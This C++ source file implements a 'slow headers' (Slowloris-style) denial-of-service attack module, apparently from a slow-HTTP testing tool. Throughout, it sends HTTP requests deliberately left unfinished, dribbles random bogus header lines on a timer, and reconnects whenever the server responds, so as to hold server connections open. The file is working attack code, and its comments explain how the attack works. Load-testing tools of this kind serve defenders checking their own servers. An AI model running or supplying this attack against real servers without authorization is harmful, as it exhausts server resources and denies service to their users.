// SPDX-License-Identifier: Apache-2.0
// Copyright 2011-2026 Sergey Shekyan and contributors
#include "slowhttp/attacks/slow_headers.hpp"

#include <cstddef>

#include "slowhttp/request.hpp"

namespace slowhttp {

SlowHeaders::SlowHeaders(const Config& cfg)
    : cfg_(cfg),
      interval_(std::chrono::duration_cast<Millis>(cfg.interval)),
      rng_(std::random_device{}()),
      followups_sent_(static_cast<std::size_t>(cfg.connections), 0) {}

void SlowHeaders::on_open(ConnId id) {
  if (id >= 0 && static_cast<std::size_t>(id) < followups_sent_.size())
    followups_sent_[id] = 0;
}

Action SlowHeaders::on_connect(ConnId /*id*/) {
  // Send the request line plus a few real headers, but never the terminating
  // blank line, then schedule the first followup dribble.
  return Action::send(initial_request(), interval_);
}

Action SlowHeaders::on_timer(ConnId id) {
  if (id >= 0 && static_cast<std::size_t>(id) < followups_sent_.size())
    ++followups_sent_[id];
  // Dribble one more bogus header line and re-arm for the next interval.
  return Action::send(followup_line(), interval_);
}

Action SlowHeaders::on_readable(ConnId /*id*/, const char* /*data*/,
                                std::size_t /*len*/) {
  // Any response byte (or EOF, len == 0) means the server stopped waiting for our
  // "still incoming" request. Drop it and reconnect to keep the pressure on.
  return Action::reconnect();
}

std::string SlowHeaders::initial_request() const {
  std::string req;
  req.reserve(256);
  req += RequestSpec::from(cfg_).serialize_http11();
  // Intentionally NO terminating CRLF here: the request stays "unfinished".
  // That omission is the whole attack; everything above it is an ordinary
  // request, built where every other attack builds one.
  return req;
}

std::string SlowHeaders::followup_line() {
  // e.g. "X-abcd: efgh\r\n" with randomized token lengths bounded by -x.
  std::string line = "X-";
  line += random_token(cfg_.max_random_data_len);
  line += ": ";
  line += random_token(cfg_.max_random_data_len);
  line += "\r\n";
  return line;
}

std::string SlowHeaders::random_token(int max_len) {
  static const char kAlphabet[] =
      "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  int lo = 1;
  int hi = max_len < 2 ? 2 : max_len;
  std::uniform_int_distribution<int> len_dist(lo, hi);
  std::uniform_int_distribution<int> ch_dist(0, sizeof(kAlphabet) - 2);
  int n = len_dist(rng_);
  std::string s;
  s.reserve(n);
  for (int i = 0; i < n; ++i) s += kAlphabet[ch_dist(rng_)];
  return s;
}

}  // namespace slowhttp
